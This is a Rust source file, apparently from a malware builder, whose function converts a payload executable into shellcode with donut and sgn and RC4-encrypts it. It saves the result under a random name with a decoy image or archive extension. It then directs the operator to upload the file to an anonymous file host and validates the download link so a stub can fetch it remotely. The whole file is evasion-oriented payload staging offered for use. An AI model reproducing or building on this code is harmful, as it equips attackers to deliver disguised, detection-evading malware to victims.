use std::{fs, io::{BufRead, Write}, process::Command};

use colored::{Color, Colorize};
use rand::{rngs::OsRng, Rng, RngCore};

use crate::{binary_arch::BinaryArch, crypto, h, mf_runner::MfStubCS, random, MfBuilder};

pub fn build_native_stage(build_config: &mut MfBuilder, st: &mut MfStubCS) -> String {
    println!("{}{}", h(), "Generating shellcode...".color(Color::Yellow));
    println!("{}{}", h(), "Stage 1".color(Color::Yellow));

    if build_config.build_arch == BinaryArch::X64 {
        Command::new("cmd.exe").args(["/c", "donut.exe", "-a", "2", "-b", "1", "--input:payload.exe", "--output:donut.bin"]).spawn().unwrap().wait().unwrap();
    } else {
        Command::new("cmd.exe").args(["/c", "donut.exe", "-a", "1", "-b", "1", "--input:payload.exe", "--output:donut.bin"]).spawn().unwrap().wait().unwrap();
    }
    
    println!("{}{}{}", h(), "File created:        ".color(Color::Yellow), "donut.bin".color(Color::Blue));

    if build_config.build_arch == BinaryArch::X64 {
        println!("{}{}", h(), "Stage 2".color(Color::Yellow));
        Command::new("cmd.exe").args(["/c", "sgn.exe", "--input=donut.bin", "--out=sgn.bin"]).spawn().unwrap().wait().unwrap();
        
        println!("{}{}{}", h(), "File created:        ".color(Color::Yellow), "sgn.bin".color(Color::Blue));
        build_config.payload_bytes = fs::read("sgn.bin").unwrap();
        fs::remove_file("donut.bin").unwrap();
        println!("{}{}{}", h(), "File deleted:        ".color(Color::Yellow), "donut.bin".color(Color::Blue));
        
        fs::remove_file("sgn.bin").unwrap();
        println!("{}{}{}", h(), "File deleted:        ".color(Color::Yellow), "sgn.bin".color(Color::Blue));
    } else {
        build_config.payload_bytes = fs::read("donut.bin").unwrap();
        fs::remove_file("donut.bin").unwrap();
        println!("{}{}{}", h(), "File deleted:        ".color(Color::Yellow), "donut.bin".color(Color::Blue));
        
    }

    crypto::cipher_rc4::RC4::new(&st.payload_key).cipher(&mut build_config.payload_bytes);

    let file_extension = [
        ".zip", ".rar", ".jpg", ".jpeg", ".txt", ".png", ".gif" 
    ][OsRng.next_u32() as usize % 7].to_string();
    let encrypted_shellcode_file_name = random::generate(OsRng.gen_range(10..=20)) + &file_extension;
    let encrypted_shellcode_path = st.working_directory.clone() + "\\" + &encrypted_shellcode_file_name;

    fs::write(&encrypted_shellcode_path, &build_config.payload_bytes).unwrap();
    println!("{}{}{}", h(), "File created:        ".color(Color::Yellow), ("WorkingDirectory\\".to_string() + &encrypted_shellcode_file_name).color(Color::Blue));
    println!("{}{}{}", h(), "Shellcode generated (".color(Color::Yellow), (build_config.payload_bytes.len().to_string() + " bytes)").color(Color::Yellow));

    println!("{}", "---".color(Color::White));
    println!("{}{}{}", h(), "Please upload the encrypted shellcode file: ".color(Color::BrightMagenta), encrypted_shellcode_path.color(Color::Yellow));
    println!("{}{}{}{}", h(), "You may use any file storage service which offers a direct download link. ".color(Color::BrightMagenta), "https://www.anonfile.la/".color(Color::Yellow), " is recommended".color(Color::BrightMagenta));
    
    let mut input_url = String::new();
    loop {
        input_url.clear();
        print!("\n{}{}", h(), "Enter the direct download link: ".color(Color::BrightMagenta));
        std::io::stdout().flush().unwrap();
        if std::io::stdin().lock().read_line(&mut input_url).is_ok() {
            input_url = input_url.replace(" ", "");
            if !input_url.starts_with("https://") {
                println!("{}{}", h(), "Invalid URL, your download link must begin with \"https://\"".color(Color::BrightRed));
                continue;
            }
            
        }

        if let Ok(resp) = reqwest::blocking::get(&input_url) {
            if resp.status().is_success() {
                println!("{}{}", h(), "Download link is valid".color(Color::Yellow));
                break;
            }
        }
        println!("{}{}", h(), "Request failed, invalid download link or no internet connection".color(Color::BrightRed));
    }
    
    fs::remove_file(encrypted_shellcode_path).unwrap();
    println!("{}{}{}", h(), "File deleted:        ".color(Color::Yellow), ("WorkingDirectory\\".to_string() + &encrypted_shellcode_file_name).color(Color::Blue));
    println!("{}", "---".color(Color::White));

    return input_url;
}